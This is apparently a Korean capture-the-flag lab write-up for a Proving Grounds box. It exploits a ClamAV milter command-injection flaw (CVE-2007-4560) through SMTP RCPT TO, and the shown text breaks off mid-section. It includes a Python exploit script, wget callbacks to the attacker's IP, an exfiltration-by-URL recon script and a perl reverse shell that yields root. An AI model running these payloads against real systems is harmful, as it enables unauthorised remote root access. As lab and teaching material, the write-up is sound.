---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/smtp
  - tech/rce/cmd-injection
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.42
domain: 0xbabe.local
ports: [22, 25, 80, 139, 199, 445, 60000]
services: [http, netbios-ssn, smtp, smux, ssh]
cves: [CVE-2007-4560]
status: solved
manual_tags: true
manual_cves: true
tech_count: 3
---
> [!warning] 적대적 검증 정정 이력 (2026-08-20)
> 초고를 `~/PG/ClamAV/` 산출물 전량과 대조해 아래를 고쳤다. 터미널 블록은 전부 원문으로 되돌렸다. 전체 대조는 `_AUDIT/ClamAV-audit.md`.
>
> | 위치 | 무엇이 틀렸나 | 어떻게 고쳤나 |
> |---|---|---|
> | frontmatter | `tech/mail/smtp`·`tech/injection/command` 는 볼트에 없는 태그였다 (이 노트가 처음 만든 것) | 표준 태그 `tech/svc/smtp`·`tech/rce/cmd-injection` 로 교체. [[Bratarina]] 와 같은 태그가 돼야 검색에 걸린다 |
> | 1장 EICAR 절 | "EICAR 로 먼저 확인하고 그 다음 RCE 를 확정했다"는 2단계 서사 | 같은 메시지 하나였다(`try1.log`, 14:25:19). EICAR 응답과 `GET /probe1` 이 동시에 왔다. 진짜 1단계는 `smtp_probe1.txt`(14:23:33) 다 |
> | 1장 nmap 블록 | `as: nmap -sCV ...` 로 손봄 | 원문은 `as: /usr/lib/nmap/nmap --privileged -sCV ...` |
> | 1장 웹·SMB | 정찰 단계에 배치 | mtime 상 14:42~14:44, root 를 잡은 뒤다. 사후 확인임을 명시 |
> | 2장 clamav 확인 블록 | 실제로는 두 번의 복합 명령인데 `sh-2.05b#` 프롬프트 3개로 재구성 | `shell_session.log` 원문 그대로 복원 |
> | 2장 페이로드 해설 | "`\|` 는 프로그램 배달 문자" / "인용을 빼면 RCPT 에서 거절된다" | `\|` 는 `popen` 문자열 안의 셸 파이프다. 인용 없는 형태는 시도한 적이 없어 `[가정]` 으로 강등 |
> | 4·5장 증거 블록 | 실행한 명령에서 `clear;`·`date;` 를 빼고 `ls` 출력을 말없이 줄임 | 원문 복원 |
> | 6장 (2) | 콜백 소스포트 `32823` | `listener443.log` 원문은 `32803` |
> | 6장 (2) | "세 번 다 유령 연결이 먼저 붙었다" | 그 시점 리스너 로그가 없다. 유령 wget 의 존재는 증거가 있으나(큐 3건, `grep -c wget`=4) 3회 모두라는 인과는 `[가정]` |
> | 6장 (3) | "`cd` 가 왜 안 먹는지 설명이 완결되지 않았다" | 파이프라인 서브셸 가설로 관측 넷을 설명. 여전히 `[가정]` 이되 근거를 붙였다. 작업 디렉터리가 milter 임시 디렉터리라는 것은 Metasploit 모듈 주석이 뒷받침 |
> | 6장 (4) | `"GET /0123...0123"` 을 실측 로그 블록으로 제시 | try15 를 덮는 HTTP 로그가 저장돼 있지 않다(`http_stager.log` 는 14:34:53 에서 끝난다). 코드펜스 밖으로 빼고, 보존된 반증 증거인 `try7.log` 를 앞세웠다 |
>
> 지적으로 올랐다가 **노트가 옳아서 되살린 것**: 소문자 접힘 · `cd` 무효 · `dpkg` 0.84 vs 실행 0.91 · 아웃바운드 차단 없음 · 93자 절단 — 다섯 항목 모두 산출물이 뒷받침한다.

> [!info] PG Practice — ClamAV
> **타겟** 192.168.248.42 · **OS** Linux (Debian sarge, 커널 2.6.8-4-386, 호스트명 `0xbabe.local`) · **난이도** Fundamental · **플래그 1개** (`/root/proof.txt`)
> **경로 요약** tcp/25 Sendmail 8.13.4 뒤에 clamav-milter 0.91 이 `--black-hole-mode` 로 붙어 있다 → SMTP `RCPT TO:` 의 local-part 에 명령을 주입(CVE-2007-4560) → milter 가 root 이므로 처음부터 uid=0. 권한상승 단계가 없다.

## 0. 이 박스에서 배우는 것

- SMTP 는 배너만 보고 넘기는 서비스가 아니다. MTA 뒤에 붙은 milter/필터가 진짜 공격면인 경우가 있고, 그건 nmap 배너에 안 나온다
- 주소 필드 명령 주입(`RCPT TO: <nobody+"|cmd"@localhost>`)의 형태와, 그게 왜 `popen` 한 줄에서 나오는지
- 원격 실행이 블라인드일 때 성공을 확인하는 법 — 내 HTTP 서버 액세스 로그를 오라클로 쓴다
- 블라인드 RCE 채널에는 제약이 붙는다는 감각. 이 박스에서는 대문자가 소문자로 접히고, 명령이 93자에서 잘리고, `cd` 가 먹지 않았다. 리버스셸이 안 붙을 때 방화벽부터 의심하면 시간을 태운다
- 시험 출제 가능성: 2007년 CVE 라 같은 번호가 나올 일은 없다. 전이되는 건 "필터·헬퍼 프로세스가 사용자 입력을 셸에 넘긴다"는 부류와, 블라인드 RCE 를 오라클로 계측하는 반사신경이다. OSCP 범위에서 이 부류는 메일·프린터·백업 에이전트·안티바이러스 같은 보조 데몬에서 나온다

## 1. 정찰

### Nmap

```
# Nmap 7.98 scan initiated Thu Aug 20 14:22:36 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.42
Nmap scan report for 192.168.248.42
Host is up (0.086s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-title: Ph33r
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
...
|_clock-skew: mean: 5h59m59s, deviation: 2h49m42s, median: 3h59m59s
```

(`smtp-commands`·`http-methods`·OS 지문·traceroute 는 잘랐다. 원문은 `~/PG/ClamAV/nmap.log`.)

읽을 것이 넷 있다.

`sarge`·`Apache 1.3.33`·`Sendmail 8.13.4` 는 전부 Debian 3.1(2005) 라인이다. 이 정도로 오래된 스택이면 개별 CVE 를 뒤지기 전에 "이 박스가 이름을 걸고 있는 서비스"부터 확인하는 게 빠르다.

60000/tcp 가 22/tcp 와 호스트키가 같다. 같은 sshd 가 두 포트에 물려 있을 뿐이고 별개 서비스가 아니다. 호스트키 지문 대조는 "포트가 여러 개인데 같은 데몬인가"를 판정하는 가장 싼 방법이다.

`-p-` 를 안 붙였으면 60000 은 못 봤다. 이 박스에서 top-200 스캔(`quick.log`, 1.03초)과 전 포트 스캔(74.5초)의 차이가 정확히 그 한 줄이었다. 결과적으로 경로와는 무관했다.

`clock-skew ... median: 3h59m59s` — 타겟 시계가 4시간 어긋나 있다. 나중에 셸에서 `date` 를 치면 Kali 시각과 안 맞는데, 그건 타겟 시계가 틀린 것이다. 시험 증거 스크린샷의 시각이 이상해 보이면 이걸 먼저 의심하라.

### 웹 (tcp/80) 과 SMB — 사실은 셸을 잡은 뒤에 본 것이다

아래 두 절의 산출물 mtime 은 14:42~14:44 다. root 를 잡은 게 14:35 이므로 정찰이 아니라 사후 확인이었다. 경로에는 기여하지 않았고 기록으로만 남긴다.

```
$ curl -s -i http://192.168.248.42/          # 저장본 http_root.txt
HTTP/1.1 200 OK
Date: Thu, 20 Aug 2026 09:42:19 GMT
Server: Apache/1.3.33 (Debian GNU/Linux)
Last-Modified: Thu, 22 Jan 2009 01:57:56 GMT
ETag: "660ee-121-4977d2a4"
Accept-Ranges: bytes
Content-Length: 289
Content-Type: text/html; charset=iso-8859-1

<html>
<head><title>Ph33r</title></head>
<body>
<center>
<p></p>
<p>01101001 01100110 01111001 01101111 01110101 01100100 01101111 01101110 01110100 01110000 01110111 01101110 01101101 01100101 01110101 01110010 01100001 01101110 00110000 00110000 01100010
</p>
</center>
</body>
</html>
```

0/1 만 골라 8비트씩 끊어 디코드한 결과(`web_binary_decoded.txt`):

```
bits 168
ifyoudontpwnmeuran00b
```

168비트 = 21바이트. 크레덴셜이 아니라 도발 문구다. 여기서 파봐야 아무것도 없다.

```
$ smbclient -L //192.168.248.42 -N          # 저장본 smb_shares.txt
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
	ADMIN$          IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
Reconnecting with SMB1 for workgroup listing.
```

읽을 만한 공유가 없다. Samba 3.0.14a 자체가 오래된 버전이라 별도 경로가 있을 수 있지만 이 박스에서는 시도하지 않았다.

### 서비스 식별 — 이름이 아니라 행동으로 판정한다

박스 이름이 ClamAV 인데 nmap 은 ClamAV 를 한 줄도 보여주지 않는다. clamd(3310)도, milter 소켓도 TCP 로 노출돼 있지 않다. 이름을 근거로 파는 건 [[Cockpit]] 에서 하루를 태운 함정이라 서비스가 실제로 그렇게 행동하는지를 봐야 했다.

먼저 던진 건 EICAR 가 아니라 주소 문법 테스트였다(14:23:33, `smtp_probe1.txt`). 인용된 local-part 에 셸 메타문자를 넣었을 때 sendmail 이 받아주는지부터 확인한 것이다:

```
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Thu, 20 Aug 2026 05:23:33 -0400; (No UCE/UBE) logging access from: [192.168.45.207](FAIL)-[192.168.45.207]
250 localhost.localdomain Hello [192.168.45.207], pleased to meet you
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+":/bin/touch /tmp/clamtest;"@localhost>... Recipient ok
221 2.0.0 localhost.localdomain closing connection
```

`250 Recipient ok` 가 돌아왔다. 다만 여기서 `DATA` 를 보내지 않고 QUIT 했기 때문에 명령은 실행되지 않았다 — milter 는 메시지 본문 단계에 가야 돌아간다. 주소가 받아들여졌다는 것만 확인한 셈이다.

EICAR 확인과 RCE 확정은 그 다음 한 방(14:25:19, `try1.log`)에서 동시에 왔다. 3장을 보라.

> [!tip] MTA 를 만나면 먼저 볼 것
> 배너 버전으로 CVE 를 뒤지기 전에 필터가 붙어 있는지를 본다. EICAR 를 DATA 로 넣어 `554 ... detected by` 가 돌아오면 AV milter 가 인라인으로 붙어 있다는 뜻이고, 그 순간 공격면이 MTA 에서 milter 로 옮겨간다. EICAR 는 실제 악성코드가 아니라 AV 동작 확인용 표준 테스트 문자열이라 이런 확인에 그대로 쓸 수 있다.

## 2. 취약점 분석 — CVE-2007-4560

### 배경

milter 는 sendmail 이 메일 처리 도중에 호출하는 외부 필터 프로세스다. clamav-milter 는 그중 바이러스 검사를 맡는다.

`--black-hole-mode` 는 "수신자의 메일함이 어차피 `/dev/null` 로 가면 검사 비용을 아끼자"는 최적화다. 그러려면 수신자의 배달 방식을 먼저 알아야 하고, clamav-milter 는 그걸 `sendmail -bv <수신자>` 를 돌려서 알아낸다. NVD 설명이 그 지점을 그대로 짚는다:

> clamav-milter in ClamAV before 0.91.2, when run in black hole mode, allows remote attackers to execute arbitrary commands via shell metacharacters that are used in a certain popen call, involving the "recipient field of sendmail."
> — NVD, CVE-2007-4560

핵심은 `popen` 이다. 수신자 주소가 셸 명령줄에 문자열로 끼어 들어간다. 그래서 SMTP 대화에서 `RCPT TO:` 에 셸 메타문자를 넣으면 그게 셸로 흘러간다.

### 이 박스가 정확히 그 조건이다

셸을 잡은 뒤 확인한 값이다(획득 후 확인이라 순서상 뒤지만 근거로 붙여둔다). `shell_session.log` 원문:

```
sh-2.05b# dpkg -l 2>/dev/null | grep -i clam; ps aux | grep -i clamav | grep -v
grep; grep -i milter /etc/mail/sendmail.mc 2>/dev/null; grep -i -A3 blackhole /e
tc/clamav/clamav-milter.conf 2>/dev/null; ls /etc/default/ | grep -i clam
ii  clamav         0.84-2.sarge.1 antivirus scanner for Unix
ii  clamav-base    0.84-2.sarge.1 base package for clamav, an anti-virus utili
ii  clamav-freshcl 0.84-2.sarge.1 downloads clamav virus databases from the In
ii  libclamav1     0.84-2.sarge.1 virus scanner library
root      3778  0.0 11.0 71396 28344 ?       Ss   05:19   0:00 /usr/local/sbin/c
lamav-milter --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
INPUT_MAIL_FILTER(`clmilter',`S=local:/var/run/clamav/clamav-milter.ctl,F=, T=S:
4m;R:4m')dnl
define(`confINPUT_MAIL_FILTERS', `clmilter')
sh-2.05b# clear; /usr/local/sbin/clamav-milter --version; ls -la /usr/local/sbin
/
ClamAV version 0.91, clamav-milter version 0.91
total 504
drwxrwsr-x   2 root staff   4096 Jan 21  2009 .
drwxrwsr-x  10 root staff   4096 Jan 21  2009 ..
-rwxr-xr-x   1 root staff 202166 Jan 21  2009 clamav-milter
-rwxr-xr-x   1 root staff 291307 Jan 21  2009 clamd
```

조건이 전부 채워진다 — 버전 0.91(< 0.91.2), `--black-hole-mode` 켜짐, 실행 사용자 root. 마지막 항목이 이 박스에 권한상승 장이 없는 이유다.

그리고 `dpkg -l` 은 clamav 0.84-2.sarge.1 을 보여주는데 실제로 도는 바이너리는 `/usr/local/sbin/clamav-milter` = 0.91 이다. 소스 빌드가 `/usr/local` 에 얹혀 있다. 버전 판정을 `dpkg`/`apt` 만으로 하면 여기서 틀린다. `ps aux` 로 실행 경로를 보고 그 바이너리에 `--version` 을 물어야 맞는 값이 나온다.

### 왜 이 페이로드인가

```
RCPT TO: <nobody+"|<명령>"@localhost>
```

임의로 만든 형태가 아니라 이 CVE 의 표준형이다. Metasploit 모듈(`exploit/unix/smtp/clamav_milter_blackhole`)도 `<nobody+"|sh msg*"@localhost>` 를 만든다.

조각별로:

- `nobody+` — 존재하는 로컬 사용자 + `+detail` 형태. sendmail 이 주소를 정상 파싱하고 `250 Recipient ok` 를 주도록 하는 껍데기다. `smtp_probe1.txt` 에서 확인했다
- `"..."` — local-part 인용. 두 가지를 동시에 한다. SMTP 주소 문법상 공백·`/`·`;` 를 local-part 에 넣으려면 인용이 필요하고, 동시에 이 따옴표들이 `popen` 문자열 안에서 셸의 인용을 여닫아 뒤의 `|` 를 셸이 해석하는 위치로 만든다. `[가정]` — 인용 없이 보내면 어떻게 되는지는 이 박스에서 시험하지 않았다
- `|` — `popen` 이 넘긴 문자열 안의 셸 파이프다. sendmail 의 프로그램 배달(`|command` 별칭)이 아니라 셸이 명령을 갈라내는 지점이라는 뜻이다
- `@localhost` — 로컬 배달로 잡히게 하는 도메인부

명령 자체는 결과가 화면에 안 돌아온다. 그래서 처음부터 "실행됐는지"를 밖에서 볼 수 있는 명령을 골랐다.

> [!danger] 작업 디렉터리가 `/tmp` 가 아니다
> Metasploit 모듈 주석이 이걸 명시한다 — clamav-milter 는 `/tmp/clamav-<hash>/` 를 만들고 그 디렉터리가 프로세스의 작업 디렉터리이며, 메시지 본문을 `msg.XXXXXX` 로 거기 쓴다. 모듈의 페이로드가 `sh msg*` 라는 상대경로인 이유가 그거다. 이 사실을 모르고 `/tmp/x.sh` 를 쓰면 조용히 아무 일도 안 일어난다 — 6장 (3)에서 정확히 이걸로 시간을 태웠다.

## 3. Foothold

### 익스플로잇 스크립트

`~/PG/ClamAV/clamex.py` — 인자로 받은 명령을 `RCPT TO:` 에 넣고, DATA 본문에 EICAR 를 실어 milter 를 확실히 태운다.

```python
#!/usr/bin/env python3
import socket, sys, time

TARGET = "192.168.248.42"
CMD = sys.argv[1] if len(sys.argv) > 1 else "/usr/bin/wget http://192.168.45.207/probe-$(id -u)"

lines = [
    "HELO x",
    "MAIL FROM: <>",
    'RCPT TO: <nobody+"|%s"@localhost>' % CMD,
    "DATA",
    "Subject: test",
    "",
    "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
    ".",
    "QUIT",
]

s = socket.create_connection((TARGET, 25), 15)
s.settimeout(3)
```
(이하 recv 루프. 전문은 `~/PG/ClamAV/clamex.py`.)

EICAR 문자열의 `\P` 때문에 파이썬이 매 실행마다 `SyntaxWarning: invalid escape sequence '\P'` 를 뱉는다. 모든 `try*.log` 첫 줄에 찍혀 있는 게 그것이고 동작에는 영향이 없다. 원문을 그대로 뒀다.

`settimeout(3)` 은 처음에 15로 뒀다가 줄였다. DATA 본문 줄들은 서버가 응답을 주지 않아 매 줄마다 recv 가 타임아웃 시간만큼 대기하고, 15초면 세션이 너무 길어져 `.` 을 보내기 전에 잘렸다. 그러면 명령이 아예 실행되지 않는다 — 실제로 한 번 이걸로 헛발질했다(try3, 로그가 `354 Enter mail` 에서 끊겨 있다).

DATA 본문에 EICAR 를 넣은 건 milter 를 반드시 통과시키려는 의도였다. EICAR 없이도 되는지는 시험하지 않았다.

### 1단계 — 실행되는지부터 확인 (블라인드 RCE 오라클)

Kali 에서 tmux 로 HTTP 서버를 띄우고 타겟이 그걸 긁게 만든다. 액세스 로그가 곧 "실행됐다"는 증거다.

```
$ tmux new-session -d -s clamav_http 'cd ~/PG/ClamAV/www && sudo python3 -m http.server 80; exec bash'
$ python3 clamex.py '/usr/bin/wget http://192.168.45.207/PROBE1'
```

`try1.log`:
```
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Thu, 20 Aug 2026 05:24:30 -0400; (No UCE/UBE) logging access from: [192.168.45.207](FAIL)-[192.168.45.207]
>>> HELO x
250 localhost.localdomain Hello [192.168.45.207], pleased to meet you
>>> MAIL FROM: <>
250 2.1.0 <>... Sender ok
>>> RCPT TO: <nobody+"|/usr/bin/wget http://192.168.45.207/PROBE1"@localhost>
250 2.1.5 <nobody+"|/usr/bin/wget http://192.168.45.207/PROBE1"@localhost>... Recipient ok
>>> DATA
354 Enter mail, end with "." on a line by itself
>>> Subject: test
>>> 
>>> X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
>>> .
554 5.7.1 virus Eicar-Test-Signature detected by ClamAV - http://www.clamav.net
>>> QUIT
221 2.0.0 localhost.localdomain closing connection
```

그리고 HTTP 서버 쪽(`http_stager.log`):

```
192.168.248.42 - - [20/Aug/2026 14:25:18] "GET /probe1 HTTP/1.0" 404 -
```

이 한 번에 세 가지가 나왔다.

`554 ... Eicar-Test-Signature detected by ClamAV` — 배너에 없어도 행동이 ClamAV milter 의 존재를 증명한다.

`GET /probe1` — RCE 확정이고, 아웃바운드 tcp/80 이 열려 있다.

그리고 함정 하나. 보낸 건 `PROBE1` 인데 요청은 `probe1` 이다. 명령이 소문자로 접혀서 실행된다. 대문자가 필요한 옵션(`wget -O`, `curl -O`, `nc -N`)은 이 채널로는 못 보낸다. 뒤에서 실제로 이것 때문에 페이로드를 다시 짰다.

메일이 `554` 로 거절됐는데도 명령은 돌았다는 점도 기억할 것. 거절 응답은 실행 실패를 뜻하지 않는다.

### 2단계 — 타겟에 뭐가 있는지 알아낸다

리버스셸을 짜기 전에 도구가 있는지부터 봤다. 결과를 URL 경로에 실어 되돌려 받는 방식이다.

`www/d.sh`:
```sh
#!/bin/sh
W=/usr/bin/wget
U=http://192.168.45.207
$W $U/uid=$(id -u)-$(id -un)
for b in perl nc netcat python telnet bash socat mkfifo; do
  p=$(which $b 2>/dev/null | tr / _)
  $W "$U/bin-$b=${p:-none}"
done
```

`tr / _` 는 경로의 `/` 가 URL 경로 구분자로 먹히지 않게 바꾸는 것이다. 안 바꾸면 로그에서 값이 갈라져 읽기 어렵다.

HTTP 로그에 그대로 찍혔다:

```
"GET /uid=0-root HTTP/1.0" 404 -
"GET /bin-perl=_usr_bin_perl HTTP/1.0" 404 -
"GET /bin-nc=none HTTP/1.0" 404 -
"GET /bin-netcat=none HTTP/1.0" 404 -
"GET /bin-python=none HTTP/1.0" 404 -
"GET /bin-telnet=_usr_bin_telnet HTTP/1.0" 404 -
"GET /bin-bash=_bin_bash HTTP/1.0" 404 -
"GET /bin-socat=none HTTP/1.0" 404 -
"GET /bin-mkfifo=_usr_bin_mkfifo HTTP/1.0" 404 -
```

`uid=0-root` — 이 시점에 이미 게임이 끝났다. 그리고 `nc`·`python`·`socat` 이 전부 없고 perl 만 있다.

> [!tip] 셸을 잡기 전에 이 한 번을 돌리는 게 이득이다
> 블라인드 RCE 에서 리버스셸을 바로 던지면, 안 붙었을 때 원인이 도구 없음 / 아웃바운드 차단 / 페이로드 문법 중 무엇인지 구분이 안 된다. 도구 인벤토리 한 번이 그 세 갈래를 미리 잘라준다.

### 3단계 — perl 리버스셸

`www/q.sh`:
```sh
#!/bin/sh
/usr/bin/perl -e 'use Socket;$i="192.168.45.207";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

셸 코드를 SMTP 주소에 직접 넣지 않고 파일로 내려받아 실행한다. 주소 필드에는 93자 상한과 소문자 접힘이 걸려 있어서(6장) 긴 페이로드는 그 길로 못 보낸다.

리스너 먼저:
```
$ tmux new-session -d -s clamav_l4444 'rlwrap nc -lvnp 4444; exec bash'
```

두 번의 SMTP 메시지로 나눠 보낸다 — 내려받기 한 번, 실행 한 번:
```
$ python3 clamex.py 'cd /tmp;/usr/bin/wget 192.168.45.207/q.sh'
$ python3 clamex.py 'cd /tmp;/bin/sh q.sh'
```

두 번째가 `/tmp/q.sh` 가 아니라 상대경로 `q.sh` 인 것이 핵심이다. 이유는 6장 (3)에 있다.

```
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.42] 32833
sh: no job control in this shell
sh-2.05b#
```

`sh-2.05b#` — `#` 이니 root 다. perl 이 `exec("/bin/sh -i")` 로 넘겨준 대화형 셸이고 웹셸이 아니다.

## 4. 권한상승

없다. milter 가 root 로 돌아서 최초 실행 시점부터 uid=0 이다.

그래도 셸 직후 반사 명령은 돌려뒀다. `shell_session.log` 원문:

```
sh-2.05b# whoami; id; hostname; date; uname -a; ls -la /root /home
root
uid=0(root) gid=0(root)
0xbabe.local
Thu Aug 20 05:35:45 EDT 2026
Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686 GNU/Linux
/home:
total 12
drwxrwsr-x   3 root staff 4096 Jan 19  2009 .
drwxr-xr-x  21 root root  4096 Mar 20  2020 ..
drwxr-xr-x   2 1000  1000 4096 Jan 19  2009 ryu

/root:
total 36
drwxr-xr-x   4 root root 4096 Aug 20 01:18 .
drwxr-xr-x  21 root root 4096 Mar 20  2020 ..
drwx------   2 root root 4096 Jan 20  2009 .aptitude
-rw-------   1 root root    0 Jul  3  2020 .bash_history
-rw-r--r--   1 root root  412 Dec 15  2004 .bashrc
-rw-r--r--   1 root root  110 Nov 10  2004 .profile
drwxr-xr-x   2 root root 4096 Sep 26  2010 .ssh
-rw-r--r--   1 root root  173 Nov  9  2005 dbootstrap_settings
-rw-r--r--   1 root root 1336 Nov  9  2005 install-report.template
-rw-r--r--   1 root root   33 Aug 20 05:19 proof.txt
```

`date` 가 `05:35:45 EDT` 인데 이걸 친 Kali 쪽 시각은 14:35 KST(= 01:35 EDT)다. 타겟 시계가 4시간 앞서 있고 nmap 의 `clock-skew median: 3h59m59s` 가 같은 걸 말한다. 2008년대 Debian 이라 NTP 가 안 돌 뿐이다.

`/root/.ssh` 가 있으니 지속 접근을 원했으면 키를 심을 자리가 있었다(하지 않았다). `/home/ryu` 는 `.bash_profile`·`.bashrc` 뿐이고 플래그가 없다.

> [!warning] 뚫자마자 root 일 수도 있다
> uid=0 을 먼저 확인하지 않고 `sudo -l`·SUID 를 뒤졌다면 시간을 버렸을 것이다. 순서는 항상 `id` 가 먼저다. 데몬이 root 로 도는 구식 스택에서는 흔하다.

## 5. 플래그

`/root/proof.txt` 하나뿐이다. `find / -name local.txt 2>/dev/null` 는 아무것도 반환하지 않았다 — 단일 플래그 박스이고 포털 표기(`0/1`)와 일치한다. `shell_session.log` 에 그 확인이 `NOLOCAL-DONE` 마커와 함께 남아 있다.

시험 증거 형식대로 한 화면에 담은 것(`proof.txt` 원문, 흔적 정리를 끝낸 뒤 14:41):

```
sh-2.05b# clear; whoami; id; hostname; /sbin/ifconfig eth0 | grep "inet addr"; d
ate; cat /root/proof.txt
root
uid=0(root) gid=0(root)
0xbabe.local
          inet addr:192.168.248.42  Bcast:192.168.248.255  Mask:255.255.255.0
Thu Aug 20 05:41:47 EDT 2026
9e16b9729fc839292f26d8d0b1e0d89f
```

> [!warning] 이 해시는 2026-08-20 인스턴스의 값이다
> PG 는 박스를 리버트하거나 다시 켤 때마다 플래그를 새로 만든다([[Flu]] 에서 두 인스턴스가 서로 다른 값을 냈다). 다음에 이 박스를 켜면 `9e16b972…` 는 안 맞는다. 값을 외우지 말고 경로(`/root/proof.txt`)와 재현 절차를 외워라.

`ip a` 대신 `/sbin/ifconfig` 를 쓴 것은 sarge 시절 박스에서 `ip` 가 없거나 PATH 밖일 가능성이 커서다. `[가정]` — 이 박스에서 `ip a` 를 실제로 쳐보지는 않았다.

## 6. 막혔던 지점 / 시행착오

RCE 확정(14:25)에서 셸(14:35)까지 10분을 태웠다. 전부 채널 제약을 몰라서 생긴 것이고 방화벽 문제는 하나도 없었다.

### 17번의 발사 — 무엇을 보내서 무엇을 배웠나

`~/PG/ClamAV/` 에 `smtp_probe1.txt` 와 `try1`~`try17` 이 그대로 있다. local-part 안에 넣은 명령과 결과만 뽑으면:

| 로그 | 주입한 명령 | 길이 | `.` 이후 응답 | 결과 |
|---|---|---|---|---|
| `smtp_probe1` | `:/bin/touch /tmp/clamtest;` | — | DATA 안 보냄 | 주소는 `250 ok`. 실행은 안 됨 |
| `try1` | `/usr/bin/wget .../PROBE1` | 42 | `554 virus` | `GET /probe1` — RCE 확정 + 소문자 접힘 발견 |
| `try2` | `cd /tmp;wget .../s.sh;/bin/sh /tmp/s.sh` | 66 | 없음 | s.sh 200 다운. bash `/dev/tcp` 콜백 없음 |
| `try3` | 위와 같은 형태(p.sh) | 66 | 없음 | clamex.py 타임아웃 15초 → `.` 전에 죽음. 실행 자체가 안 됨 |
| `try4` | `cd /tmp;wget .../p.sh;/bin/sh /tmp/p.sh` | 66 | 없음 | p.sh 200 다운. perl→443 콜백 없음 |
| `try5` | `wget http://192.168.45.207:443/p443` | 51 | 없음 | 443 리스너에 GET 도착 → 아웃바운드 443 열림 |
| `try6` | `cd /tmp;wget .../d.sh;/bin/sh /tmp/d.sh` | 66 | `554 virus` | d.sh 200 다운. 실행은 여전히 안 됨 |
| `try7` | `cd /tmp;wget .../aaa;/bin/sh /tmp/d.sh;wget .../zzz` | 105 | 없음 | `GET /aaa` 만 도착, `GET /zzz` 없음 → 길이 절단의 첫 증거 |
| `try8` | `cd /tmp;/bin/sh d.sh` (상대경로) | 20 | `554 virus` | 인벤토리 9줄 전부 도착 → 상대경로가 답 |
| `try9`·`10`·`12` | `cd /tmp;/bin/sh p.sh` | 20 | `250 accepted` | perl→443 리버스셸. 3회 전부 콜백 없음 |
| `try11` | `/usr/bin/killall wget` | 21 | `250 accepted` | 유령 wget 정리 시도 — 실패 |
| `try13` | `cd /tmp;wget 192.168.45.207/q.sh` | 41 | `250 accepted` | q.sh 200 다운 |
| `try14` | `cd /tmp;/bin/sh q.sh` | 20 | 없음 | perl→4444 → root 대화형 셸 |
| `try15` | `wget 192.168.45.207/` + 숫자 200자 | 229 | `554 virus` | 길이 상한 계측 — (4) |
| `try16` | `wget .../one;wget .../two` | 65 | `554 virus` | 93자 밑에서 `;` 체이닝 정상 |
| `try17` | `cd /tmp;wget .../d.sh;wget .../after` | 76 | `554 virus` | `cd` 접두어가 붙어도 뒤 명령이 사는지 확인 |

표에서 바로 읽히는 게 하나 있다. `.` 이후 응답이 `554`·`250 accepted`·무응답 셋으로 갈리는데 **셋 다 명령은 실행됐다.** try1(554)·try13(250)·try14(무응답) 모두 실행이 확인된다. 그리고 무응답은 실패가 아니라 주입한 명령이 아직 안 끝났다는 뜻이다 — try14 는 리버스셸이 붙어 있어서 응답이 안 왔다.

> [!danger] 무응답 메시지는 큐에 남아 나중에 다시 실행된다
> `.` 이후 무응답으로 끝난 try2(05:26)·try4(05:28)·try5(05:29) 셋이, 셸에서 본 `/var/spool/mqueue` 의 `df*` 세 개(05:26·05:29·05:29)와 정확히 일치했다. 확인용으로 보낸 명령이 몇 분 뒤 되살아나 리스너를 방해할 수 있다는 뜻이다. (2) 참조.

### (1) `bash -i >& /dev/tcp/...` 를 먼저 시도했다 — 확인 없이 버렸다

첫 스테이저 `www/s.sh` 는 bash `/dev/tcp` 리버스셸(443)이었다. HTTP 로그에 `GET /s.sh 200` 이 찍혔으니 내려받기는 됐는데 콜백이 안 왔다.

그 시점에 "Debian bash 는 net redirection 이 꺼져 있다"고 결론 낼 뻔했는데, 뒤에 밝혀진 진짜 원인은 실행 명령이 `/bin/sh /tmp/s.sh` 였고 그 경로에 파일이 없었던 것이다(아래 (3)). 스크립트가 아예 안 돌았다. 그래서 이 박스에서 bash `/dev/tcp` 가 되는지 안 되는지는 끝까지 확인하지 못했다. 안 해본 것을 안 해봤다고 적어둔다.

### (2) 리스너를 큐에 남은 옛 명령이 잡아먹었다

443 아웃바운드를 확인하려고 `wget http://192.168.45.207:443/p443` 를 한 번 보냈다(try5). `listener443.log` 에 결과가 남아 있다:

